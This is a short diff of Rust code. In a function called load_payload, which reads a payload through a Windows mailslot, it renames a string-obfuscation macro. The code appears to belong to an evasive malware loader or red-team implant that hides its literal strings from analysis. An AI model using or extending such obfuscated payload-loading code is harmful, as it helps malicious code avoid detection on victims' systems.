@@ -43,7 +43,7 @@ pub fn load_payload() -> Result<Vec<u8>, String> {
         );
 
         if h_slot == -1 { // INVALID_HANDLE_VALUE
-            return Err(String::from_utf8_lossy(obf_lit_bytes!(b"Failed to create mailslot\0").as_slice()).to_string());
+            return Err(String::from_utf8_lossy(obfbytes!(b"Failed to create mailslot\0").as_slice()).to_string());
         }
 
         // 2. Spawn Writer Thread (Client)
@@ -126,7 +126,7 @@ pub fn load_payload() -> Result<Vec<u8>, String> {
         if total_read == expected_len {
             Ok(buffer)
         } else {
-            Err(format!("{} Read: {}, Expected: {}", String::from_utf8_lossy(obf_lit_bytes!(b"Failed to read full payload from mailslot.\0").as_slice()).to_string(), total_read, expected_len))
+            Err(format!("{} Read: {}, Expected: {}", String::from_utf8_lossy(obfbytes!(b"Failed to read full payload from mailslot.\0").as_slice()).to_string(), total_read, expected_len))
         }
     }
 }
